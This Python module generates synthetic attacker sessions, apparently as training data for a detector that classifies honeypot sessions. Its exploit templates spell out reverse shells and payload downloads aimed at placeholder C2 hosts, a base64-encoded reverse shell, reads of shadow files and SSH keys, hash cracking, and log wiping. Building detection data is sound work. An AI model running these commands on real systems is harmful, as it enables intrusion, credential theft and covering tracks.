"""
Synthetic data generator for rare classes.

Generates realistic synthetic sessions for:
- Class 1 (Recon): Network reconnaissance and scanning
- Class 3 (Exploit): Credential theft, RAT deployment, packed malware

Uses MITRE ATT&CK-informed command templates to generate
semantically meaningful synthetic data.
"""

import random
import json
import pandas as pd
import numpy as np
from typing import List, Dict, Optional, Tuple
from pathlib import Path


# =============================================================================
# MITRE-Informed Command Templates
# =============================================================================

# Class 1: Recon - Reconnaissance/Scanning commands
RECON_TEMPLATES = [
    # Network scanning
    "nmap -sS -p {ports} {target}",
    "nmap -sV -O {target}",
    "nmap -sn {network}",
    "masscan -p{ports} {network} --rate={rate}",
    "zmap -p {port} {network}",
    
    # Host enumeration
    "ping -c 4 {target}",
    "traceroute {target}",
    "dig {domain}",
    "nslookup {domain}",
    "host {domain}",
    "whois {domain}",
    
    # Service probing
    "nc -zv {target} {port}",
    "telnet {target} {port}",
    "curl -I http://{target}:{port}",
    "wget --spider http://{target}:{port}",
    
    # System reconnaissance
    "uname -a",
    "cat /etc/os-release",
    "cat /proc/cpuinfo",
    "cat /proc/meminfo",
    "df -h",
    "free -m",
    "uptime",
    "w",
    "who",
    "last",
    "id",
    "whoami",
    "hostname",
    "ifconfig",
    "ip addr",
    "ip route",
    "netstat -tulpn",
    "ss -tulpn",
    "ps aux",
    "ps -ef",
    "top -bn1",
    
    # User enumeration
    "cat /etc/passwd",
    "cat /etc/group",
    "getent passwd",
    "awk -F: '$3 >= 1000 {print $1}' /etc/passwd",
    
    # File system recon
    "find / -perm -4000 2>/dev/null",
    "find / -perm -2000 2>/dev/null",
    "ls -la /home",
    "ls -la /root",
    "ls -la /tmp",
    "find / -name '*.conf' 2>/dev/null",
    "find / -name '*.key' 2>/dev/null",
    "find / -name '*.pem' 2>/dev/null",
    
    # Network recon
    "arp -a",
    "cat /etc/hosts",
    "cat /etc/resolv.conf",
    "cat /proc/net/tcp",
    "cat /proc/net/udp",
]

# Class 3: Exploit - Credential theft, RAT, packed malware
EXPLOIT_TEMPLATES = [
    # Credential access
    "cat /etc/shadow",
    "cat /etc/passwd",
    "cat ~/.ssh/id_rsa",
    "cat ~/.ssh/authorized_keys",
    "cat ~/.bash_history",
    "cat ~/.mysql_history",
    "cat ~/.psql_history",
    "cat /var/log/auth.log",
    "cat /var/log/secure",
    "strings /dev/mem | grep -i password",
    "grep -r 'password' /etc 2>/dev/null",
    "grep -r 'passwd' /home 2>/dev/null",
    "find / -name '.htpasswd' 2>/dev/null",
    "cat /etc/samba/smb.conf",
    "cat /etc/pam.d/common-auth",
    
    # Credential dumping
    "unshadow /etc/passwd /etc/shadow > hashes.txt",
    "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
    "hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt",
    "mimipenguin",
    
    # Key extraction
    "gpg --export-secret-keys > keys.gpg",
    "openssl rsa -in {keyfile} -text",
    "ssh-keyscan {target}",
    
    # RAT deployment patterns
    "wget http://{c2}/rat -O /tmp/.{name} && chmod +x /tmp/.{name} && /tmp/.{name} &",
    "curl -s http://{c2}/payload | bash",
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{c2}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "bash -i >& /dev/tcp/{c2}/{port} 0>&1",
    "nc -e /bin/sh {c2} {port}",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {c2} {port} >/tmp/f",
    "perl -e 'use Socket;$i=\"{c2}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
    
    # Packed/obfuscated execution
    "base64 -d <<< '{b64_payload}' | bash",
    "echo '{b64_payload}' | base64 -d | sh",
    "python -c \"exec(__import__('base64').b64decode('{b64_payload}'))\"",
    "eval $(echo '{hex_payload}' | xxd -r -p)",
    "gzip -d < {packed_file} | sh",
    "gunzip -c /tmp/.{name}.gz | bash",
    
    # Process injection / hollowing
    "LD_PRELOAD=/tmp/.{lib} /bin/ls",
    "export LD_PRELOAD=/tmp/.{lib}",
    "cat /proc/{pid}/maps",
    "cat /proc/{pid}/mem",
    
    # Anti-forensics with exploit
    "shred -u /var/log/auth.log",
    "echo '' > ~/.bash_history",
    "history -c",
    "unset HISTFILE",
    "export HISTSIZE=0",
]

# Template variables
TEMPLATE_VARS = {
    'ports': ['22', '80', '443', '8080', '3306', '5432', '22,80,443', '1-1000', '1-65535'],
    'port': ['22', '80', '443', '8080', '3306', '5432', '6379', '27017', '9200'],
    'target': ['192.168.1.1', '10.0.0.1', '172.16.0.1', 'localhost', '127.0.0.1'],
    'network': ['192.168.1.0/24', '10.0.0.0/8', '172.16.0.0/16', '0.0.0.0/0'],
    'domain': ['google.com', 'example.com', 'target.local', 'internal.corp'],
    'rate': ['100', '1000', '10000', '100000'],
    'c2': ['192.168.1.100', '10.10.10.10', 'evil.com', 'c2.attacker.net'],
    'name': ['sshd', 'cron', 'systemd', 'apache2', 'nginx', 'update', 'helper'],
    'lib': ['libcrypt.so', 'libpam.so', 'libc.so.6'],
    'keyfile': ['/root/.ssh/id_rsa', '/home/user/.ssh/id_rsa', '/etc/ssl/private/server.key'],
    'pid': ['1', '$$', '$(pgrep sshd)', '$(pgrep apache2)'],
    'b64_payload': ['YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMQ=='],
    'hex_payload': ['6563686f202768656c6c6f27'],
    'packed_file': ['/tmp/.update.gz', '/var/tmp/.cache.gz'],
}


def fill_template(template: str) -> str:
    """Fill a template with random variable values."""
    result = template
    for var, values in TEMPLATE_VARS.items():
        placeholder = '{' + var + '}'
        if placeholder in result:
            result = result.replace(placeholder, random.choice(values))
    return result


def generate_session_commands(
    templates: List[str],
    min_commands: int = 1,
    max_commands: int = 10
) -> str:
    """Generate a session's commands from templates."""
    num_commands = random.randint(min_commands, max_commands)
    selected = random.choices(templates, k=num_commands)
    commands = [fill_template(t) for t in selected]
    return '; '.join(commands)


# =============================================================================
# MITRE Feature Generation
# =============================================================================

def compute_mitre_features_for_recon() -> Dict[str, float]:
    """
    Generate plausible MITRE features for Recon sessions.
    
    Recon focuses on: reconnaissance, discovery tactics
    """
    return {
        'mitre_tactic_reconnaissance': random.uniform(1.0, 5.0),
        'mitre_tactic_resource_development': 0.0,
        'mitre_tactic_initial_access': 0.0,
        'mitre_tactic_execution': random.uniform(0.0, 1.0),
        'mitre_tactic_persistence': 0.0,
        'mitre_tactic_privilege_escalation': random.uniform(0.0, 0.5),
        'mitre_tactic_defense_evasion': random.uniform(0.0, 0.5),
        'mitre_tactic_credential_access': random.uniform(0.0, 0.5),
        'mitre_tactic_discovery': random.uniform(2.0, 8.0),
        'mitre_tactic_lateral_movement': random.uniform(0.0, 1.0),
        'mitre_tactic_collection': random.uniform(0.0, 1.0),
        'mitre_tactic_command_and_control': 0.0,
        'mitre_tactic_exfiltration': 0.0,
        'mitre_tactic_impact': 0.0,
        'mitre_severity_max': random.uniform(4.0, 7.0),
        'mitre_severity_mean': random.uniform(3.0, 5.0),
        'mitre_severity_weighted': random.uniform(3.0, 6.0),
        'mitre_kill_chain_score': random.uniform(1.0, 3.0),
        'mitre_unique_technique_count': random.randint(2, 8),
        'mitre_total_commands': random.randint(3, 15),
        'mitre_matched_commands': random.randint(2, 10),
    }


def compute_mitre_features_for_exploit() -> Dict[str, float]:
    """
    Generate plausible MITRE features for Exploit sessions.
    
    Exploit focuses on: credential access, execution, defense evasion
    """
    return {
        'mitre_tactic_reconnaissance': random.uniform(0.0, 1.0),
        'mitre_tactic_resource_development': random.uniform(0.0, 0.5),
        'mitre_tactic_initial_access': random.uniform(0.0, 1.0),
        'mitre_tactic_execution': random.uniform(2.0, 6.0),
        'mitre_tactic_persistence': random.uniform(0.0, 2.0),
        'mitre_tactic_privilege_escalation': random.uniform(1.0, 4.0),
        'mitre_tactic_defense_evasion': random.uniform(2.0, 6.0),
        'mitre_tactic_credential_access': random.uniform(3.0, 8.0),
        'mitre_tactic_discovery': random.uniform(1.0, 3.0),
        'mitre_tactic_lateral_movement': random.uniform(0.0, 2.0),
        'mitre_tactic_collection': random.uniform(1.0, 4.0),
        'mitre_tactic_command_and_control': random.uniform(1.0, 4.0),
        'mitre_tactic_exfiltration': random.uniform(0.0, 2.0),
        'mitre_tactic_impact': random.uniform(0.0, 1.0),
        'mitre_severity_max': random.uniform(7.0, 10.0),
        'mitre_severity_mean': random.uniform(5.0, 8.0),
        'mitre_severity_weighted': random.uniform(6.0, 9.0),
        'mitre_kill_chain_score': random.uniform(3.0, 7.0),
        'mitre_unique_technique_count': random.randint(4, 15),
        'mitre_total_commands': random.randint(5, 20),
        'mitre_matched_commands': random.randint(4, 15),
    }


# =============================================================================
# Binary Feature Generation
# =============================================================================

def get_zero_binary_features() -> Dict[str, float]:
    """
    Return zero binary features (no malware downloaded).
    
    This matches the schema from sessions_complete.csv.
    """
    binary_cols = [
        # Triage features
        'triage_file_size', 'triage_entropy', 'triage_priority',
        'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
        'triage_is_dll', 'triage_is_static', 'triage_score_mining',
        'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive',
        # Ghidra features
        'ghidra_function_count', 'ghidra_total_instructions', 'ghidra_total_basic_blocks',
        'ghidra_max_function_size', 'ghidra_avg_callers', 'ghidra_max_callers',
        'ghidra_mining_pool_count', 'ghidra_crypto_wallet_count', 'ghidra_ip_count',
        'ghidra_url_count', 'ghidra_shell_cmd_count', 'ghidra_file_path_count',
        'ghidra_imports_file_io', 'ghidra_imports_process', 'ghidra_imports_network',
        'ghidra_imports_crypto', 'ghidra_imports_evasion', 'ghidra_has_aes_sbox',
        'ghidra_has_sha256_constants', 'ghidra_has_rc4_state', 'ghidra_has_xor_loop',
        'ghidra_go_user_functions', 'ghidra_go_runtime_functions',
        # angr features
        'angr_basic_blocks', 'angr_edges', 'angr_functions_recovered',
        'angr_cyclomatic_complexity', 'angr_function_count', 'angr_user_functions_listed',
        'angr_syscalls_network', 'angr_syscalls_file_io', 'angr_syscalls_process',
        'angr_syscalls_memory', 'angr_ip_count', 'angr_url_count',
        'angr_mining_indicator_count', 'angr_shell_cmd_count', 'angr_has_network',
        'angr_has_file_manipulation', 'angr_has_process_control', 'angr_has_crypto',
        'angr_has_mining', 'angr_has_persistence', 'angr_has_evasion',
        'angr_has_shell_execution', 'angr_complexity_tier', 'angr_is_partial',
        'angr_loaded_as_blob',
        # Script features
        'script_line_count', 'script_url_count', 'script_download_count',
        'script_arch_count', 'script_is_downloader', 'script_is_multi_arch',
        'script_is_miner', 'script_has_persistence', 'script_has_anti_forensics',
        # Deep features
        'has_ghidra_results', 'has_angr_results', 'has_script_results',
        'deep_func_ratio_angr_ghidra', 'deep_mining_signal_count',
        'deep_total_network_indicators', 'deep_total_crypto_indicators',
        'deep_max_complexity', 'deep_total_evasion_indicators', 'deep_is_go_consensus',
    ]
    return {col: 0.0 for col in binary_cols}


def generate_recon_binary_features() -> Dict[str, float]:
    """
    Generate binary features typical of recon scanner downloads.
    """
    features = get_zero_binary_features()
    
    # Recon sessions might download scanners
    if random.random() < 0.3:  # 30% chance of having a binary
        features['triage_file_size'] = random.uniform(10000, 500000)
        features['triage_entropy'] = random.uniform(5.5, 7.5)
        features['triage_priority'] = random.uniform(20, 50)
        features['triage_score_recon'] = random.uniform(0.5, 1.0)
        features['angr_has_network'] = 1.0
        features['has_angr_results'] = 1.0
    
    return features


def generate_exploit_binary_features() -> Dict[str, float]:
    """
    Generate binary features typical of exploit/RAT downloads.
    """
    features = get_zero_binary_features()
    
    # Exploit sessions often involve packed/obfuscated binaries
    if random.random() < 0.5:  # 50% chance of having a binary
        features['triage_file_size'] = random.uniform(50000, 2000000)
        features['triage_entropy'] = random.uniform(6.5, 7.9)  # Higher entropy (packed)
        features['triage_priority'] = random.uniform(50, 90)
        features['triage_is_packed'] = random.choice([0.0, 1.0])
        features['triage_is_stripped'] = 1.0
        
        # Credential theft indicators
        features['ghidra_imports_file_io'] = random.randint(5, 20)
        features['ghidra_imports_network'] = random.randint(3, 15)
        features['ghidra_imports_crypto'] = random.randint(0, 10)
        features['ghidra_imports_evasion'] = random.randint(1, 8)
        
        # Network indicators (C2)
        features['angr_has_network'] = 1.0
        features['angr_syscalls_network'] = random.randint(2, 10)
        features['angr_ip_count'] = random.randint(1, 5)
        
        features['has_ghidra_results'] = 1.0
        features['has_angr_results'] = 1.0
    
    return features


# =============================================================================
# Main Generator Class
# =============================================================================

class SyntheticGenerator:
    """
    Generator for synthetic sessions for rare classes.
    
    Generates MITRE-informed synthetic data for:
    - Class 1 (Recon): 0 real sessions -> needs synthetic
    - Class 3 (Exploit): 0 real sessions -> needs synthetic
    """
    
    CLASS_NAMES = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']
    
    def __init__(self, random_seed: int = 42):
        """
        Args:
            random_seed: Random seed for reproducibility
        """
        self.random_seed = random_seed
        random.seed(random_seed)
        np.random.seed(random_seed)
    
    def generate_recon_session(self) -> Dict:
        """Generate a single Recon (class 1) session."""
        commands = generate_session_commands(RECON_TEMPLATES, min_commands=3, max_commands=12)
        mitre = compute_mitre_features_for_recon()
        binary = generate_recon_binary_features()
        
        session = {
            'session_id': f'synthetic_recon_{random.randint(100000, 999999)}',
            'src_ip': f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
            'num_commands': commands.count(';') + 1,
            'duration_sec': random.uniform(10, 600),
            'commands': commands,
            'label_id': 1,
            'label_name': 'Recon',
            **mitre,
            **binary,
            'num_downloads': 0 if binary['triage_file_size'] == 0 else 1,
            'download_shas': '',
        }
        return session
    
    def generate_exploit_session(self) -> Dict:
        """Generate a single Exploit (class 3) session."""
        commands = generate_session_commands(EXPLOIT_TEMPLATES, min_commands=2, max_commands=8)
        mitre = compute_mitre_features_for_exploit()
        binary = generate_exploit_binary_features()
        
        session = {
            'session_id': f'synthetic_exploit_{random.randint(100000, 999999)}',
            'src_ip': f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
            'num_commands': commands.count(';') + 1,
            'duration_sec': random.uniform(30, 1200),
            'commands': commands,
            'label_id': 3,
            'label_name': 'Exploit',
            **mitre,
            **binary,
            'num_downloads': 0 if binary['triage_file_size'] == 0 else 1,
            'download_shas': '',
        }
        return session
    
    def generate_batch(
        self,
        n_recon: int = 500,
        n_exploit: int = 500
    ) -> pd.DataFrame:
        """
        Generate a batch of synthetic sessions.
        
        Args:
            n_recon: Number of Recon (class 1) sessions
            n_exploit: Number of Exploit (class 3) sessions
        
        Returns:
            DataFrame with synthetic sessions
        """
        sessions = []
        
        print(f"Generating {n_recon} Recon sessions...")
        for _ in range(n_recon):
            sessions.append(self.generate_recon_session())
        
        print(f"Generating {n_exploit} Exploit sessions...")
        for _ in range(n_exploit):
            sessions.append(self.generate_exploit_session())
        
        df = pd.DataFrame(sessions)
        print(f"Generated {len(df)} total synthetic sessions")
        
        return df
    
    def save_synthetic(self, output_path: str, n_recon: int = 500, n_exploit: int = 500):
        """Generate and save synthetic data to CSV."""
        df = self.generate_batch(n_recon, n_exploit)
        df.to_csv(output_path, index=False)
        print(f"Saved synthetic data to {output_path}")
        return df


def generate_synthetic_data(
    n_recon: int = 500,
    n_exploit: int = 500,
    random_seed: int = 42,
    save_path: Optional[str] = None
) -> pd.DataFrame:
    """
    Convenience function to generate synthetic data.
    
    Args:
        n_recon: Number of Recon sessions
        n_exploit: Number of Exploit sessions
        random_seed: Random seed
        save_path: Optional path to save CSV
    
    Returns:
        DataFrame with synthetic sessions
    """
    generator = SyntheticGenerator(random_seed=random_seed)
    df = generator.generate_batch(n_recon=n_recon, n_exploit=n_exploit)
    
    if save_path:
        df.to_csv(save_path, index=False)
        print(f"Saved to {save_path}")
    
    return df
